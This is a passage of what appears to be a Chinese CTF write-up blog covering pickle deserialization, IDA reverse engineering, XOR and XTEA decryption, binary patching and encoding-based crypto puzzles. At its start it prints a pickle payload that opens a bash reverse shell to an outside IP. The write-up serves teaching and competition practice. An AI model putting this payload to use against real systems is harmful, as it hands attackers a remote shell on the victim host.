class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">o.</span><br><span class="line"></span><br><span class="line">payload: (cos%<span class="number">0</span>asystem%0aS%27bash%<span class="number">20</span>-i%<span class="number">20</span>&gt;%<span class="number">26</span>%<span class="number">20</span>/dev/tcp/<span class="number">8.138</span><span class="number">.168</span><span class="number">.65</span>/<span class="number">443</span>%<span class="number">200</span>&gt;%<span class="number">261</span>%<span class="number">27</span>%0ao.</span><br><span class="line"></span><br><span class="line">(S<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/8.138.168.65/443 0&gt;&amp;1&#x27;</span></span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">payload: (S%27bash%<span class="number">20</span>-i%<span class="number">20</span>&gt;%<span class="number">26</span>%<span class="number">20</span>/dev/tcp/<span class="number">8.138</span><span class="number">.168</span><span class="number">.65</span>/<span class="number">443</span>%<span class="number">200</span>&gt;%<span class="number">261</span>%<span class="number">27</span>%0aios%<span class="number">0</span>asystem%0a.</span><br></pre></td></tr></table></figure><p><code>CNSS&#123;fl4g_f0r_smArt_k1ds&#125;</code><br />考点<code>pickle反序列化反弹shell</code></p><h2 id="没有人比我更懂ruoyi"><a class="markdownIt-Anchor" href="#没有人比我更懂ruoyi"></a> 🐣 没有人比我更懂RuoYi()</h2><p><a href="https://forum.butian.net/share/2796">https://forum.butian.net/share/2796</a><br />小看了一下，然后有事，后续无……</p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h1><h2 id="nc-nc"><a class="markdownIt-Anchor" href="#nc-nc"></a> 😯nc? nc!</h2><p>显而易见的<code>pwn</code>签到，<code>ls</code>，<code>cat flag</code></p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="那个女人"><a class="markdownIt-Anchor" href="#那个女人"></a> 😍 那个女人</h2><p><img src="https://picx.zhimg.com/80/v2-06d6c5046f8e882a5e6676370b6242a2_1440w.png" alt="" /><br />考点<code>IDA的使用</code></p><h2 id="我的flag碎了一地"><a class="markdownIt-Anchor" href="#我的flag碎了一地"></a> 😭我的flag碎了一地</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Hint:&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1. Open in IDA and Learn about `Strings` to find the first part of the flag&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2. Learn about `Functions` to find the second part of the flag which is the name of a function&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3. The hint for the last part is in the function you found in the second part&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>flag1</code>，<code>shift+F12</code>，查找字符串</p><p><code>flag2</code>，<code>Functions</code><br /><img src="https://picx.zhimg.com/80/v2-2bf48124e57f02427a7a33ac5722d3ca_1440w.png" alt="" /></p><p><code>flag3</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Learn about `Xref` and Find out which function refers me to get the last part of the flag!&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>views–&gt;Open subsviews–&gt;Function Call</code></p><p><img src="https://picx.zhimg.com/80/v2-02ebe7d85228cc2243618ce84837dd42_1440w.png" alt="" /></p><p><code>CNSS&#123;My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!&#125;</code><br />考点(每年必出老题)<code>IDA的基本使用</code></p><h2 id="️-亦真亦或亦假"><a class="markdownIt-Anchor" href="#️-亦真亦或亦假"></a> ♾️ 亦真亦或亦假</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4[<span class="number">12</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line">  __int64 v6[<span class="number">12</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+F0h] [rbp+70h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+FCh] [rbp+7Ch]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0x731047656E6F7579</span>i64;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0x761B45794B10407D</span>i64;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0x6E005B71491F585F</span>i64;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">0x45045205575D01</span>i64;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6[<span class="number">4</span>], <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  eNc0d3(v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">30</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)v4 + i) != *((_BYTE *)v6 + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">eNc0d3</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">26</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> __int8 *)(a1 + i);</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = v3++ ^ *(_BYTE *)(a1 + i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">0x79</span>, <span class="number">0x75</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x10</span>, <span class="number">0x73</span>,</span><br><span class="line">     <span class="number">0x7D</span>, <span class="number">0x40</span>, <span class="number">0x10</span>, <span class="number">0x4B</span>, <span class="number">0x79</span>, <span class="number">0x45</span>, <span class="number">0x1B</span>, <span class="number">0x76</span>,</span><br><span class="line">     <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x1F</span>, <span class="number">0x49</span>, <span class="number">0x71</span>, <span class="number">0x5B</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>,</span><br><span class="line">     <span class="number">0x01</span>, <span class="number">0x5D</span>, <span class="number">0x57</span>, <span class="number">0x05</span>, <span class="number">0x52</span>, <span class="number">0x04</span>, <span class="number">0x45</span>, <span class="number">0x00</span>]</span><br><span class="line">key = <span class="number">26</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c[i] ^ (key+i)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>cnss&#123;X0R_c4n_b3_us3d_t0_3nc0d3&#125;</code><br />注意是小端序</p><p>考点<code>简单异或</code></p><h2 id="茶杯头大冒险"><a class="markdownIt-Anchor" href="#茶杯头大冒险"></a> 🍵 茶杯头大冒险</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v5 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 += (((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)) + v5) ^ (a2[v4 &amp; <span class="number">3</span>] + v4);</span><br><span class="line">    v4 += <span class="number">289739793</span>;</span><br><span class="line">    v5 += (((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)) + v6) ^ (a2[(v4 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a1[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD Str[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6[<span class="number">6</span>]; <span class="comment">// [rsp+60h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">429459223</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">537200643</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">537462290</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">537006083</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">-999025570</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">970203505</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">-181949973</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">-483739382</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="number">1062983671</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="number">-697079924</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input the flag: \n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Str) == <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">      encrypt(&amp;Str[i], v6);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[j] != v5[j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it&#x27;s not my teapot!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Oh my god, you made it?!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the length is NSFW~~~&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>XTEA</code><a href="https://bbs.kanxue.com/thread-266933.htm">https://bbs.kanxue.com/thread-266933.htm</a><br />24位的<code>flag</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">int32_t</span>* v, <span class="type">uint32_t</span>* key)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">289739793</span>;</span><br><span class="line"><span class="type">uint32_t</span> sum = delta &lt;&lt; <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">sum -= delta;</span><br><span class="line">v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">key[<span class="number">0</span>] = <span class="number">429459223</span>;</span><br><span class="line">key[<span class="number">1</span>] = <span class="number">537200643</span>;</span><br><span class="line">key[<span class="number">2</span>] = <span class="number">537462290</span>;</span><br><span class="line">key[<span class="number">3</span>] = <span class="number">537006083</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int32_t</span> enc[<span class="number">12</span>];</span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">-999025570</span>;</span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">970203505</span>;</span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">-181949973</span>;</span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">-483739382</span>;</span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">1062983671</span>;</span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">-697079924</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">decrypt(&amp;enc[i], key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\\n&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cnss&#123;Enj0y_te4_W!th_me!&#125;</code><br />考点<code>XTEA加密算法</code></p><h2 id="️-打飞机高手"><a class="markdownIt-Anchor" href="#️-打飞机高手"></a> ✈️ 打飞机高手</h2><p>如果<code>ida</code>有装<code>keypatch</code>这个插件的话就能直接通过更改汇编语句从而<code>patch</code>机器码<br /><a href="https://github.com/keystone-engine/keypatch">https://github.com/keystone-engine/keypatch</a><br />下载<code>Keypatch.py</code>复制到插件目录<code>IDA 7.0\plugins\Keypatch.py</code><br />下载安装<code>keystone python</code>模块，64位系统只需要安装这一个就行<br /><a href="https://github.com/keystone-engine/keystone/releases/download/0.9.1/keystone-0.9.1-python-win64.msi">https://github.com/keystone-engine/keystone/releases/download/0.9.1/keystone-0.9.1-python-win64.msi</a><br />(IDA打开一个文件之后，Edit没看见Patch，即没成功)如果不行(可能需要)继续安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install keystone-engine <span class="comment"># 安装</span></span><br><span class="line">pip install keystone-engine --upgrade <span class="comment"># 已有，则升级</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.zhimg.com/80/v2-d6b21a295490beaebf6b0b22aca2c94b_1440w.png" alt="" /><br />修改汇编语句的分数为<code>01h</code>，这个0是必须的十六进制是这样的，一路点击<code>patch</code>，最后那个不知道什么取消掉就好(不造啊)<br />然后，<code>Patch program</code>&gt;<code>apply patches to input file</code><br />重新打一次飞机即可(bushi，空格是射击)<br />好像会<code>patch</code>了()</p><p><code>cnss&#123;w0w_y0u_4r3_7he_m4st3r_0f_h1tt1ng_p1an3s!&#125;</code><br />考点<code>patch 汇编语句修改</code></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="cnss娘的谜语"><a class="markdownIt-Anchor" href="#cnss娘的谜语"></a> 🔮 cnss娘的谜语</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import base64</span></span><br><span class="line"><span class="string"># secret is a local file, flag is unknown to you. Try to find it.</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string">assert type(flag) == str</span></span><br><span class="line"><span class="string">flag = flag.encode()</span></span><br><span class="line"><span class="string">length = len(flag)</span></span><br><span class="line"><span class="string">assert length % 4 == 0</span></span><br><span class="line"><span class="string">L = length // 4</span></span><br><span class="line"><span class="string">secret1 = bytes_to_long(flag[:L])</span></span><br><span class="line"><span class="string">secret2 = flag[L:2*L].hex()</span></span><br><span class="line"><span class="string">secret3 = bin(int(flag[2*L:3*L].hex(), 16))</span></span><br><span class="line"><span class="string">secret4 = base64.b64encode(flag[3*L:])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">secret1 = 30772543014919602267414633191</span></span><br><span class="line"><span class="string">secret2 = &#x27;bc96e7a081e698afe5ada620&#x27;</span></span><br><span class="line"><span class="string">secret3 = &#x27;0b10000110111001001111001011100000111010001101111001000001110011110011010100001001110011110101100&#x27;</span></span><br><span class="line"><span class="string">secret4 = b&#x27;rOS4gOatpeOAgiF9&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">secret1 = <span class="number">30772543014919602267414633191</span></span><br><span class="line">secret2 = <span class="string">&#x27;bc96e7a081e698afe5ada620&#x27;</span></span><br><span class="line">secret3 = <span class="string">&#x27;0b10000110111001001111001011100000111010001101111001000001110011110011010100001001110011110101100&#x27;</span></span><br><span class="line">secret4 = <span class="string">b&#x27;rOS4gOatpeOAgiF9&#x27;</span></span><br><span class="line">flag1 = long_to_bytes(secret1)</span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">int</span>(secret2, <span class="number">16</span>))</span><br><span class="line">flag3 = long_to_bytes(<span class="built_in">int</span>(secret3[<span class="number">2</span>:], <span class="number">2</span>))</span><br><span class="line">flag4 = base64.b64decode(secret4)</span><br><span class="line"><span class="built_in">print</span>((flag1+flag2+flag3+flag4).decode())</span><br></pre></td></tr></table></figure><p><code>cnss&#123;学会编码是学 Crypto 的第一步。!&#125;</code><br />考点<code>基本的字符串</code></p><h2 id="水龙吟"><a class="markdownIt-Anchor" href="#水龙吟"></a> 🐬 水龙吟</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string">m = bytes_to_long(flag)</span></span><br><span class="line"><span class="string">p = 4873905926740615531018463661385452170898784133203367799135441645830937750628221985822405430005703937197770247575076559744236744538228018031486049820173674</span></span><br><span class="line"><span class="string">g = 2593552830271406523114019117101950399687742243315195843514987700785182656087120211241524521448500935829478648514527037446437576680778419567396094750508622</span></span><br><span class="line"><span class="string">c = 0</span></span><br><span class="line"><span class="string">for i in range(m):</span></span><br><span class="line"><span class="string">    c = (c + g) % p</span></span><br><span class="line"><span class="string">print(f&#x27;&#123;c = &#125;&#x27;)</span></span><br><span class="line"><span class="string">c = 3431276814099066030808269572939347769420622699894452016972504433264414095698239241816562301198442206498226641308404105790355301176892588988847042699636406</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exgcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, q = exgcd(b, a % b)</span><br><span class="line">    x, y = y, (x - a // b * y)</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LiEu</span>(<span class="params">a, b, m</span>):</span><br><span class="line">    <span class="comment"># ax = b % m</span></span><br><span class="line">    x, y, q = exgcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> b % q == <span class="number">0</span>:</span><br><span class="line">        m = m//q</span><br><span class="line">        <span class="keyword">return</span> ((x*b//q + m) % m)</span><br><span class="line">p = </span><br><span class="line">g = </span><br><span class="line">c = </span><br><span class="line">flag = LiEu(g, c, p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>x</mi><mo>≡</mo><mi>b</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax\equiv b\ (mod\ m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>等价，</mtext><mi>a</mi><mi>x</mi><mo>+</mo><mi>m</mi><mi>y</mi><mo>=</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">等价，ax+my=b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">价</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>+</mo><mi>m</mi><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mi>d</mi></mrow><annotation encoding="application/x-tex">ax&#x27;+my&#x27;=gcd(a,m)=d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi mathvariant="normal">/</mi><mi>d</mi><mtext>是整数，</mtext><mi>m</mi><mi mathvariant="normal">/</mi><mi>d</mi><mtext>也是整数，所以，</mtext><mi>d</mi><mi 